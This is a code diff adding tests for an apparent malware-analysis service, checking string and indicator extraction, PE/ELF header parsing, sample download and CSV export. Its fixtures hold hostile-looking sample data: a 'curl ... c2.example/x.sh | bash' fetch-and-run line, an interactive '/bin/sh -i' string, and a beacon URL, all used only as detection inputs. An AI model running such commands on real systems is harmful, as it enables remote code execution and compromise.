@@ -270,6 +270,149 @@ def test_samples_list_filters_by_query(client):
     assert miss["total"] == 0 and miss["samples"] == []
 
 
+# -- Static analysis (strings / IOCs / PE / ELF) ------------------------------
+
+# Minimal but structurally valid PE32+ (x86-64) — DOS stub, COFF header, PE32+
+# optional header, one .text section (mapped 0x1000–0x2200, raw at 0x400), and
+# an import table at RVA 0x2000 naming KERNEL32.dll. The section's mapped
+# window must COVER the import RVAs or the parser correctly reports no imports.
+def _build_pe() -> bytes:
+    dos = b"MZ" + b"\x00" * 0x3A + (0x40).to_bytes(4, "little")
+    coff = b"PE\x00\x00" + (0x8664).to_bytes(2, "little") + (1).to_bytes(2, "little")  # machine, nsects
+    coff += (0).to_bytes(4, "little") * 2  # timestamp, ptr_symtab
+    coff += (0).to_bytes(4, "little") + (0xF0).to_bytes(2, "little") + (0x206).to_bytes(2, "little")  # nsyms, opthdr sz, chars
+    # PE32+ optional header (0xF0 bytes): magic, entry RVA, import dir at index 1.
+    opt = (0x20B).to_bytes(2, "little") + b"\x00" * 14  # magic + linker/etc
+    opt += (0x1000).to_bytes(4, "little")  # AddressOfEntryPoint
+    opt += b"\x00" * (112 - 20)  # pad to data directories (0x70 offset)
+    # Data directory 1 (imports): RVA 0x2000, size 40 (one descriptor + null terminator)
+    opt += b"\x00" * 8  # dir 0 (exports)
+    opt += (0x2000).to_bytes(4, "little") + (40).to_bytes(4, "little")
+    opt += b"\x00" * (0xF0 - len(opt))  # pad rest of optional header
+    # One .text section: vaddr 0x1000, VirtualSize 0x1200 (window reaches 0x2200,
+    # covering the 0x2000/0x2100 import RVAs), raw at 0x400, RawSize 0x1200.
+    sec = b".text\x00\x00\x00" + (0x1200).to_bytes(4, "little")  # VirtualSize
+    sec += (0x1000).to_bytes(4, "little") + (0x1200).to_bytes(4, "little")  # VA, SizeOfRawData
+    sec += (0x400).to_bytes(4, "little") + b"\x00" * 16 + (0x60000020).to_bytes(4, "little")  # ptr, reloc/lnums/pad, chars
+    import_desc = (0).to_bytes(4, "little") * 3 + (0x2100).to_bytes(4, "little") + (0).to_bytes(4, "little")  # Name RVA
+    import_desc += b"\x00" * 20  # null terminator
+    blob = dos + coff + opt + sec
+    blob += b"\x00" * (0x400 - len(blob))  # pad to raw data
+    blob += b"\x00" * 0x1000 + import_desc  # descriptor at raw 0x1400 (= RVA 0x2000)
+    blob += b"\x00" * (0x1500 - len(blob))  # pad so the name lands at raw 0x1500
+    blob += b"KERNEL32.dll\x00"  # name at raw 0x1500 (= RVA 0x2100)
+    return blob
+
+
+# Minimal ELF64 little-endian x86-64 — exact 64-byte header + three exact
+# 64-byte section headers (null, .text, .shstrtab), then the .shstrtab
+# payload at a computed offset (never hardcoded, so the layout stays right).
+def _build_elf() -> bytes:
+    hdr = bytearray(b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8)  # ELF64 LE
+    hdr += (3).to_bytes(2, "little") + (0x3E).to_bytes(2, "little")  # DYN, x86-64
+    hdr += (0).to_bytes(4, "little") + (0x401000).to_bytes(8, "little")  # version, entry
+    hdr += (0).to_bytes(8, "little") * 2  # phoff, shoff (shoff patched below)
+    hdr += (0).to_bytes(4, "little") + (64).to_bytes(2, "little") + (0).to_bytes(2, "little")  # flags, ehsize, phentsize
+    hdr += (0).to_bytes(2, "little") + (64).to_bytes(2, "little") + (3).to_bytes(2, "little") + (2).to_bytes(2, "little")  # phnum, shentsize, shnum, shstrndx=2
+    strtab = b"\x00.text\x00.shstrtab\x00"
+
+    def _sh(name_off: int, sh_type: int, offset: int, size: int) -> bytes:
+        # Elf64_Shdr: name(4) type(4) flags(8) addr(8) offset(8) size(8)
+        # link(4) info(4) align(8) entsize(8) = 64 bytes total.
+        return (
+            name_off.to_bytes(4, "little") + sh_type.to_bytes(4, "little")
+            + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
+            + offset.to_bytes(8, "little") + size.to_bytes(8, "little")
+            + (0).to_bytes(4, "little") + (0).to_bytes(4, "little")
+            + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
+        )
+
+    sh_off = len(hdr)  # section table right after the header
+    str_off = sh_off + 3 * 64  # strtab after the three section headers
+    sh_text = _sh(1, 1, 0x1000, 0x80)  # .text, PROGBITS, sh_offset/size arbitrary
+    sh_str = _sh(7, 3, str_off, len(strtab))  # .shstrtab (starts at byte 7), STRTAB
+    hdr[40:48] = sh_off.to_bytes(8, "little")  # e_shoff
+    return bytes(hdr) + b"\x00" * 64 + sh_text + sh_str + strtab
+
+
+def test_static_analysis_pe_strings_iocs_and_sections(client):
+    blob = _build_pe() + b"http://evil.example/beacon" + b" 203.0.113.9 " + b"Invoke-Expression " + b"\x00\x00s\x00e\x00c\x00r\x00e\x00t\x00\x00\x00"
+    meta = _upload(client, blob, "stage.exe").json()
+    st = client.get(f"/samples/{meta['sample_id']}/static")
+    assert st.status_code == 200
+    body = st.json()
+    assert body["size"] == len(blob)
+    # Strings: ASCII + UTF-16LE both extracted.
+    assert any("evil.example" in s for s in body["strings"])
+    assert any("secret" in s for s in body["strings"])
+    # IOCs: URL + IP.
+    assert "http://evil.example/beacon" in body["iocs"]["urls"]
+    assert "203.0.113.9" in body["iocs"]["ips"]
+    # PE metadata: machine, bits, section, import.
+    pe = body["pe"]
+    assert pe["machine"] == "x86-64" and pe["bits"] == 64
+    assert any(s["name"] == ".text" for s in pe["sections"])
+    assert "KERNEL32.dll" in pe["imports"]
+    assert body["elf"] is None
+
+
+def test_static_analysis_elf_metadata(client):
+    blob = _build_elf() + b"/bin/sh -i"
+    meta = _upload(client, blob, "rev.elf").json()
+    st = client.get(f"/samples/{meta['sample_id']}/static").json()
+    elf = st["elf"]
+    assert elf["class"] == 64 and elf["endian"] == "little"
+    assert elf["machine"] == "x86-64" and elf["type"] == "DYN"
+    names = [s["name"] for s in elf["sections"]]
+    assert ".text" in names and ".shstrtab" in names
+    assert st["pe"] is None
+
+
+def test_static_analysis_script_has_no_pe_elf(client):
+    blob = b"#!/bin/bash\ncurl -s http://c2.example/x.sh | bash\n"
+    meta = _upload(client, blob, "curl.sh").json()
+    st = client.get(f"/samples/{meta['sample_id']}/static").json()
+    assert st["pe"] is None and st["elf"] is None
+    assert any("c2.example" in s for s in st["strings"])
+    assert "http://c2.example/x.sh" in st["iocs"]["urls"]
+
+
+def test_static_analysis_unknown_sample_404(client):
+    resp = client.get("/samples/does-not-exist/static")
+    assert resp.status_code == 404
+
+
+def test_sample_download_roundtrip(client):
+    blob = MZ + b"\x00" * 32 + b"download-me-marker"
+    meta = _upload(client, blob, "roundtrip.exe").json()
+    resp = client.get(f"/samples/{meta['sample_id']}/download")
+    assert resp.status_code == 200
+    assert resp.content == blob  # byte-identical round-trip
+    assert resp.headers.get("x-outpost-sha256") == meta["sha256"]
+    assert "roundtrip.exe" in resp.headers.get("content-disposition", "")
+
+
+def test_sample_download_unknown_404(client):
+    assert client.get("/samples/nope/download").status_code == 404
+
+
+def test_samples_csv_export(client):
+    _upload(client, MZ + b"csv-export-marker", "csv-a.exe")
+    resp = client.get("/samples/export")
+    assert resp.status_code == 200
+    assert resp.headers["content-type"].startswith("text/csv")
+    body = resp.text
+    assert "original_name" in body and "csv-a.exe" in body
+
+
+def test_samples_csv_export_route_does_not_shadow_detail(client):
+    # /samples/export must NOT be captured by /samples/{sample_id} — the
+    # static route ordering regression this guards.
+    meta = _upload(client, ELF + b"shadow-guard-marker", "shadow.elf").json()
+    assert client.get(f"/samples/{meta['sample_id']}").status_code == 200
+    assert client.get("/samples/export").status_code == 200
+
+
 def test_samples_list_counts_runs_using_same_name(client):
     meta = _upload(client, MZ + b"used-twice-unique-marker", "used-twice.exe").json()
     for _ in range(2):
